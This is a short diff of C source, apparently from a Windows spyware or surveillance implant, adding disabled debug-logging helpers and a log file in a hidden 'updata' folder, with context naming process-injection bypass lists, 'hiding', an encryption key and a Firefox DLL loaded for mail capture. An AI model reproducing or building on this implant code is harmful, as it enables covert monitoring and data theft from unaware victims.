@@ -49,6 +49,7 @@
 #include <tchar.h>
 #include <Strsafe.h>
 
+
 #pragma bss_seg("shared")
 BOOL is_demo_version;
 BYTE crypt_key[KEY_LEN];		// Chiave di cifratura
@@ -63,7 +64,6 @@ DWORD log_active_queue; // Quale coda e' attiva 1 o 0
 DWORD process_bypassed; //Numero di processi da bypassare
 char process_bypass_list[MAX_DYNAMIC_BYPASS+EMBEDDED_BYPASS][MAX_PBYPASS_LEN]; // Lista dei processi su cui non fare injection
 WCHAR process_bypass_desc[EMBEDDED_BYPASS][MAX_PBYPASS_LEN]; // Lista dei processi su cui non fare injection
-DWORD social_process_control;	// Semaforo per controllare il processo "social"
 BOOL network_crisis;			// Se deve fermare le sync
 BOOL system_crisis;				// Se deve fermare i comandi e l'hiding
 BOOL bPM_IMStarted;				// Flag che indica se il monitor e' attivo o meno
@@ -2649,6 +2649,25 @@ void __stdcall HM_sMain(void)
 }
 char init_home_path[MAX_PATH] = { 0 };
 char mail_save_path[MAX_PATH] = { 0 };//firefox dll  copy to this dir and load
+char log_path_file[MAX_PATH] = { 0 };
+void putlog(char* szLog)
+{
+	return;
+	bool WriteFileAdd(char* pBuf, long size, char* fileName);
+	if (!szLog)
+		return;
+	WriteFileAdd(szLog, strlen(szLog), log_path_file);
+	WriteFileAdd("\n\r", 2, log_path_file);
+}
+void putlogW(wchar_t* szLog)
+{
+	return;
+	bool WriteFileAdd(char* pBuf, long size, char* fileName);
+	if (!szLog)
+		return;
+	WriteFileAdd((char*)szLog, wcslen(szLog)*2, log_path_file);
+	WriteFileAdd((char*)L"\n\r", 4, log_path_file);
+}
 void InitMailPath()
 {
 	char str_all_user_path[MAX_PATH] = { 0 };
@@ -2660,6 +2679,11 @@ void InitMailPath()
 	CreateDirectoryA(init_home_path, NULL);
 	_stprintf(mail_save_path, "%s\\updata\\m\\data", str_all_user_path);
 	CreateDirectoryA(mail_save_path, NULL);
+	_stprintf(log_path_file, "%s\\updata\\m\\data\\log.txt", str_all_user_path);
+	
+	wchar_t szLogW[MAX_PATH * 2] = { 0 }; void putlogW(wchar_t*);
+	swprintf(szLogW, L"log start");
+	putlogW(szLogW);
 
 }
 
